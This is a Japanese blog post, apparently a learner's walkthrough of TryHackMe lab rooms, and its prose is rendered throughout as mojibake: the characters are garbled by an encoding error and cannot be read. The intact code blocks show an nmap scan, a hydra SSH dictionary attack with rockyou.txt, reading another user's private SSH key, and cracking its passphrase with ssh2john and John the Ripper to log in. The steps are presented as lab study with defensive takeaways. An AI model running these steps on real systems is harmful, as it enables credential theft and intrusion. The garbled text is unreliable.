---
title: "è©¦é¨“ã«å—ã‹ã£ãŸã ã‘ã®æœªç™»éŒ²ã‚»ã‚­ã‚¹ãƒšãŒã€7æ—¥é–“ã§ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å§‹ã‚ã‚‹æœ¬ã€‘ã‚’èª­ã‚€(ç’°å¢ƒæ§‹ç¯‰ã€œDay2ç·¨)"
emoji: "ğŸŒŠ"
type: "tech" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: [
  "tryhackme",
  "kalilinux",
  "security"
]
published: true
---
# ãã£ã‹ã‘
ä»¤å’Œ6å¹´ç§‹å®Ÿæ–½ã®æƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£«ã«åˆæ ¼ã—ã¾ã—ãŸğŸŒ¸  
åˆæ ¼ã—ãŸã¨ã¯ã„ãˆ  
:::message
æ•™ç§‘æ›¸ã‚’ãªãã£ã¦åˆæ ¼ã—ãŸã ã‘ã¨è¨€ãˆã‚‹çŠ¶æ…‹ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«è©³ã—ã„ã¨ã¯è¨€ãˆãªã„çŠ¶æ…‹
:::
ã§ã‚ã‚‹ã®ã§ã€ä½•ã‚‰ã‹ã®å½¢ã§ç”ŸããŸçŸ¥è­˜ã«æ˜‡è¯ã•ã›ãŸã„ã¨æ€ã£ã¦ã„ãŸã€‚  

ãã‚“ãªæ™‚ã€çŸ¥äººã®ã“ã®æœ¬ã®è©±é¡Œã«ãªã‚Šã€æ‰‹ã«ã¨ã£ã¦ã¿ã‚‹ã“ã¨ã«ã—ãŸã€‚

# æœ¬ã®å†…å®¹
[Try Hack Me](https://tryhackme.com/)ã¨ã„ã†ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã—ãŸãƒãƒ³ã‚ºã‚ªãƒ³å½¢å¼ã®å†…å®¹  
PCã«Kali Linuxã‚’ç«‹ã¦ãŸã®ã¡ã€TryHackMeã®ã‚µãƒ¼ãƒ“ã‚¹ã§ç«‹ã¦ãŸã‚µãƒ¼ãƒãƒ¼ã‚’ã‚¯ãƒ©ãƒƒã‚¯ã—ã¦ã„ãã€‚

## ãªãœKali Linuxï¼Ÿ
Kaliã«ã¯ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã«ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«ãŒæ¨™æº–ã§å‚™ã‚ã£ã¦ãŠã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åˆ†é‡ã§ã¯ã‚ˆãä½¿ç”¨ã•ã‚Œã‚‹ãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚‰ã—ã„ã€‚

# Day1ï¼ˆç’°å¢ƒæ§‹ç¯‰ï¼†ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ï¼‰
æœ¬ã§ã¯Windowsã®ä¸Šã«Virtual Boxã§Kaliã‚’ç«‹ã¦ã¦é€²ã‚ã¦ã„ãŸãŒã€è‡ªåˆ†ã¯Macãƒ¦ãƒ¼ã‚¶ãªã®ã§ç•°ãªã‚‹ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’ã¨ã£ãŸã€‚
Dockerã‚’ä½¿ç”¨ã—ã¦Kaliã‚’ç«‹ã¦ã¦ã€ãã“ã«ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã§æ¥ç¶šã™ã‚‹æ–¹æ³•ã§å®Ÿæ–½ã—ãŸã€‚
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ãŒã¨ã¦ã‚‚å‚è€ƒã«ãªã£ãŸã€‚

https://zenn.dev/k_ing/articles/abcbe71c105b3d

:::message alert
æœ€å°æ§‹æˆã®KaliãŒç«‹ã¡ä¸ŠãŒã‚‹ãŸã‚ã€ãƒ„ãƒ¼ãƒ«ãŒè¶³ã‚Šã¦ã„ãªã„ã€‚
å¿…è¦ãªãƒ„ãƒ¼ãƒ«ã‚’ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚
:::

```bash
sudo apt install kali-linux-large
```

Windows appã§ãƒªãƒ¢ãƒ¼ãƒˆæ¥ç¶šã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªç”»é¢ã¨ãªã‚‹ã¯ãšã€‚
![](/images/kali_desktop.png)

## OpenVPNã®è¨­å®š
### æœ¬ã®é€šã‚Šã«è¨­å®š
TryHackMeã§ç«‹ã¡ä¸ŠãŒã‚‹ã‚µãƒ¼ãƒãƒ¼ã®ãƒ­ãƒ¼ã‚«ãƒ«IPã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã€ç”»é¢ã«è¡¨ç¤ºã•ã‚Œã‚‹ã®ã§VPNã‚’ç¹‹ã„ã§åŒã˜ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚‹
:::message
IPAè©¦é¨“ã§ã‚‚å‡ºã‚‹åŸºæœ¬çš„ãªã“ã¨ã§ã™ãŒã€10.xxx.xxx.xxxå½¢å¼ã®IPãŒè¡¨ç¤ºã•ã‚Œã‚‹ã®ã§ã€ã“ã‚Œã¯ãƒ­ãƒ¼ã‚«ãƒ«IPã‚¢ãƒ‰ãƒ¬ã‚¹ã ãªã¨ã‚ã‹ã‚Šã¾ã™ã€‚
:::

## Tutrial Room
Day1ã§æ”»ç•¥ã™ã‚‹Room
å†…å®¹ã¯å˜ç´”ã§ã€è¡¨ç¤ºã•ã‚ŒãŸIPã‚¢ãƒ‰ãƒ¬ã‚¹ã«Kaliã®ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã€‚

# Day2(Room: Basic Pentesting)
ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã£ã½ããªã£ã¦ããŸRoomã€‚
ã‚„ã‚‹ã“ã¨ã¯ä»¥ä¸‹ã€‚
- ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³
- è¾æ›¸æ”»æ’ƒ
- sshã‚­ãƒ¼ã®ãƒ‘ã‚¹ãƒ•ãƒ¬ãƒ¼ã‚ºã®ã‚¯ãƒ©ãƒƒã‚¯

ã‚»ã‚­ã‚¹ãƒšã®è©¦é¨“ã§ã¯ãŠé¦´æŸ“ã¿ã™ãã‚‹å˜èªãŒä¸¦ã‚“ã§ã„ã‚‹ãŒã€å®Ÿéš›ã«ã©ã‚“ãªæ‰‹æ³•ã‚’ç”¨ã„ã¦ã€æ”»æ’ƒã™ã‚‹ã‹ã¯å…¨ãçŸ¥ã‚Šã¾ã›ã‚“ã€‚

## ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã¨ã¯
> **ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³**ã¯ã€å®Ÿéš›ã«ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ã‚Šã¤ã‘ã¦æ”»æ’ƒå¯¾è±¡ã‚µãƒ¼ãƒã‹ã‚‰ã®å¿œç­”ã‚’ç¢ºã‹ã‚ã€**æ¥ç¶šå¯èƒ½ãªãƒãƒ¼ãƒˆã‚’èª¿æŸ»ã™ã‚‹æ‰‹æ³•**ã§ã™ã€‚
> ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ç¢ºç«‹ã‚’è©¦ã¿ã‚‹ã“ã¨ã§èª¿æŸ»ã™ã‚‹TCPã‚¹ã‚­ãƒ£ãƒ³ã¨ã€UDPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ã£ã¦èª¿æŸ»ã™ã‚‹UDPã‚¹ã‚­ãƒ£ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚  

ï¼ˆå‡ºå…¸ï¼šTACå‡ºç‰ˆã€Œ2024å¹´åº¦ç‰ˆæƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£«ALL IN ONE ãƒ‘ãƒ¼ãƒ•ã‚§ã‚¯ãƒˆãƒã‚¹ã‚¿ãƒ¼ã€ï¼‰

### ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã‚’è©¦ã—ã¦ã¿ã‚‹
ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã‚’è¡Œã†ã«ã¯`nmap`ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®è©³ç´°ã¯èª¿ã¹ã‚‹ã‹ã€AIã«èã„ã¦ãã ã•ã„ã€‚
ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ã¯ã€TCPã‚¹ã‚­ãƒ£ãƒ³ã‚’`10.10.201.17`ã«å¯¾ã—ã¦è¡Œã„ã€ç¨¼åƒã—ã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã®ä¸€è¦§ã‚’ãƒ•ã‚¡ã‚¤ãƒ«ã«å‡ºã—ã¦ã„ã¾ã™ã€‚
```bash
$ nmap -sV -Pn -oN nmap.txt -v 10.10.201.17
```
è¦‹ã¤ã‹ã£ãŸãƒãƒ¼ãƒˆã«å¯¾ã—ã¦ã€ã‚¯ãƒ©ãƒƒã‚¯ã‚’ä»•æ›ã‘ã¦ã„ãã“ã¨ã«ãªã‚Šã¾ã™ã€‚

## è¾æ›¸æ”»æ’ƒã¨ã¯
> è¾æ›¸ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹å˜èªã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦é †ã«è©¦ã™æ–¹æ³•ã€‚Webã‚µã‚¤ãƒˆã«ã¾ã¨ã‚ã‚‰ã‚Œã¦ã„ã‚‹ç”¨èªé›†ãªã©ã®å˜èªã‚‚å«ã‚€ã€‚

ï¼ˆå‡ºå…¸ï¼šTACå‡ºç‰ˆã€Œ2024å¹´åº¦ç‰ˆæƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£«ALL IN ONE ãƒ‘ãƒ¼ãƒ•ã‚§ã‚¯ãƒˆãƒã‚¹ã‚¿ãƒ¼ã€ï¼‰

### è¾æ›¸æ”»æ’ƒã‚’è©¦ã—ã¦ã¿ã‚‹
ç´†ä½™æ›²æŠ˜ã‚ã‚Šã€ãƒ¦ãƒ¼ã‚¶IDï¼ˆä¾‹ï¼štaroï¼‰ã‚’ã‚²ãƒƒãƒˆã—ã¾ã—ãŸã€‚
`taro`ã‚’ãƒ¦ãƒ¼ã‚¶IDã€è¾æ›¸ã®ãƒªã‚¹ãƒˆã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ã€è¾æ›¸æ”»æ’ƒã‚’ä»•æ›ã‘ã¾ã™ã€‚
è¾æ›¸æ”»æ’ƒã«ã¯`hydra`ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```bash
$ hydra -l taro -P /usr/share/wordlists/rockyou.txt ssh://10.10.201.17 -t 4
```
`/usr/share/wordlists/rockyou.txt`ã¨ã„ã†ã®ãŒè¾æ›¸ã«ãªã‚Šã¾ã™ã€‚Kaliã«å«ã¾ã‚Œã¾ã™ã€‚
å®Ÿè¡Œå¾Œä»¥ä¸‹ã®ã‚ˆã†ãªçµæœãŒå¾—ã‚‰ã‚Œã¾ã™ã€‚
```
[22][ssh] host: 10.10.201.17   login: taro   password: passWord
```
ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚²ãƒƒãƒˆã—ã¾ã—ãŸã€‚ã‚ã¨ã¯sshãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã‚ˆã—ãªã«æš´ã‚Œå›ã‚Šã¾ã™ã€‚

## sshã‚­ãƒ¼ã®ã‚¯ãƒ©ãƒƒã‚¯
æœ¬ã®Day2ã¯ã“ã“ã¾ã§ã§çµ‚ã‚ã‚Šã§ã™ãŒã€Roomã®èª²é¡Œã¯ã¾ã ã‚ã‚‹ã®ã§ç¶šãã¾ã™ã€‚

`/home`ã«ä»–ã®ãƒ¦ãƒ¼ã‚¶ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒè¦‹ãˆã¾ã™ãŒã€ãªã‚“ã¨ãã®ä¸­ã«SSHã‚­ãƒ¼ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãƒ‘ãƒ¼ãƒŸãƒƒã‚·ãƒ§ãƒ³ãŒé©åˆ‡ã§ãªã„ãŸã‚ã€ä¸­èº«ãŒå‚ç…§ã§ãã¦ã—ã¾ã„ã¾ã™ã€‚

```bash
$ ls -al /home/hanako/.ssh/
total 20
drwxr-xr-x 2 hanako hanako 4096 Apr 23  2018 .
drwxr-xr-x 5 hanako hanako 4096 Apr 23  2018 ..
-rw-rw-r-- 1 hanako hanako  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 hanako hanako 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 hanako hanako  771 Apr 19  2018 id_rsa.pub
```
hanakoã®`id_rsa`ã®ä¸­èº«ã‚’ã„ãŸã ãã¾ã™ã€‚
```bash
cat /home/hanako/.ssh/id_rsa
```
ä¸­èº«ã‚’ã‚³ãƒ”ãƒ¼ã—ã¦æ–°ãŸã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œã‚Šã€SSHæ¥ç¶šã‚’è©¦ã¿ã¾ã™ã€‚
```bash
vim hanako_id_rsa
ssh -i hanako_id_rsa hanako@10.10.201.17
Enter passphrase for key 'hanako_id_rsa': 
```
ãƒ‘ã‚¹ãƒ•ãƒ¬ãƒ¼ã‚ºã‚’æ±‚ã‚ã‚‰ã‚Œã‚‹ã®ã§ã€ãƒ‘ã‚¹ãƒ•ãƒ¬ãƒ¼ã‚ºã‚’ã‚¯ãƒ©ãƒƒã‚¯ã—ã¾ã™ã€‚
ä½¿ç”¨ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã¯`john the ripper`ã§ã™ã€‚ã“ã‚Œã‚‚kaliã«å«ã¾ã‚Œã¾ã™ã€‚
```bash
# ssh2john.py
# johnãŒç†è§£ã§ãã‚‹ãƒãƒƒã‚·ãƒ¥å½¢å¼ã«å¤‰æ›
$ python3 /usr/share/john/ssh2john.py hanako_id_rsa > hash.txt

# å¤‰æ›ã—ãŸãƒãƒƒã‚·ãƒ¥ã‚’å¯¾è±¡ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã§è§£æ
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{xxxxxxxx}          (hanako_id_rsa)     
1g 0:00:00:00 DONE (2025-07-29 23:25) 3.846g/s 318276p/s 318276c/s 318276C/s bird..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
`{xxxxxxxx}`ãŒãƒ‘ã‚¹ãƒ•ãƒ¬ãƒ¼ã‚ºã§ã™ã€‚
ã“ã‚Œã§SSHæ¥ç¶šã—ã¾ã—ã‚‡ã†ã€‚
```bash
$ ssh -i hanako_id_rsa hanako@10.10.138.120
Enter passphrase for key 'hanako_id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 29 Jul 2025 10:25:49 AM EDT

  System load:  0.0                Processes:             111
  Usage of /:   49.8% of 13.62GB   Users logged in:       1
  Memory usage: 44%                IPv4 address for eth0: 10.10.138.120
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
```
ã‚µãƒ¼ãƒã¯æˆ‘ãŒæ‰‹ä¸­ã«å •ã¡ã¾ã—ãŸã€‚

# ã‚„ã£ã¦ã¿ã¦
å½“ãŸã‚Šå‰ã®ã‚ˆã†ã«ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ãƒ„ãƒ¼ãƒ«ãŒLinuxã®ãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã«å«ã¾ã‚Œã¦ã„ã¦ã€èª°ã§ã‚‚è©¦ã™ã“ã¨ãŒã§ãã‚‹ã¨ã„ã†çŠ¶æ…‹ã«é©šãã‚’æ„Ÿã˜ã¾ã—ãŸã€‚  
ç§˜å¯†éµã‹ã‚‰ãƒ‘ã‚¹ãƒ•ãƒ¬ãƒ¼ã‚ºã¾ã§å‰²ã‚Šå‡ºã•ã‚Œã‚‹å¯èƒ½æ€§ã‚‚é©šãã¾ã—ãŸã€‚SSHã‚­ãƒ¼ã®å®‰å…¨ãªä¿ç®¡ã¨å¼·å›ºãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¨­å®šã¯ã€ä»Šå¾Œã‚‚æ°—ã‚’ã¤ã‘ã‚ˆã†ã¨æ€ã„ã¾ã™ã€‚
ã¾ãŸã€æ•™ç§‘æ›¸é€šã‚Šã®å‹‰å¼·ã‚’è©¦ã—ã¦ã¿ã‚‹ã“ã¨ã§ã‚ˆã‚Šå®šç€ã—ãŸã‹ãªã¨æ€ã„ã¾ã™ã€‚  
ç§è‡ªèº«ãŒåˆ¥ã«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å°‚é–€ã«ã—ã¦ã„ã‚‹ã‚ã‘ã§ã¯ãªã„ã®ã§ã™ãŒã€ç”ŸããŸçŸ¥è­˜ã¨ã—ã¦Day3ä»¥é™ã‚‚ç¶šã‘ã¦ã„ã“ã†ã¨æ€ã„ã¾ã™ã€‚